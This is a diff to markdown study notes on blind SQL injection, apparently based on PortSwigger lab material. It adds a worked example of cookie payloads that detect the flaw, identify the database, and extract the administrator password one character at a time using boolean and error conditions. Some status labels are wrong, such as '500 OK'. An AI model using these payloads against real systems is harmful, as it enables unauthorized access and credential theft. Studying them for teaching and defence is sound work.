@@ -103,9 +103,9 @@
 
 * `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
   * …xyz' AND '1'='1
-    * The query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
+    * The query return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
   * …xyz' AND '1'='2
-    * The query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
+    * The query do not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
 * Extract data one piece at a time
   * `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
     * This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`
@@ -114,7 +114,39 @@
   * `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
     * ... Confirm that the first character of the password is `s`
   * We can continue this process to systematically determine the full password for the Administrator user.
-* `SUBSTRING` is called `SUBSTR` on some types of database (https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+**EXAMPLE**
+
+<pre class="language-markdown"><code class="lang-markdown"><strong># In this example the response are always the same. 
+</strong><strong># However, if you submit an invalid query you will get an error.
+</strong><strong>
+</strong><strong># 1 - Check if it's vulnerable
+</strong>## Normal request. 200 OK
+Cookie: TrackingId=xyz
+## Cause error. 500 Internal Server Error
+Cookie: TrackingId=xyz'
+
+
+# 2 - Identify database [tiberius cheatsheet]. NOTE: add comment...
+## (MySql). 500 Internal Server Error
+Cookie: TrackingId=xyz' AND 'foo' 'bar' = 'foobar'#
+## (ORACLE). 200 OK
+Cookie: TrackingId=a' AND LENGTHB('foo') = '3'--
+
+
+# 3 - Test boolean error. 
+## Error condition: 500 OK
+Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
+## No error condition: 200 OK
+Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
+
+
+# 4 - Extract data
+## Error condition: 500 OK (it means that first char is 'a')
+Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
+## No error condition: 200 OK
+Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'b') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
+</code></pre>
 
 ### Error-based SQL injection
 
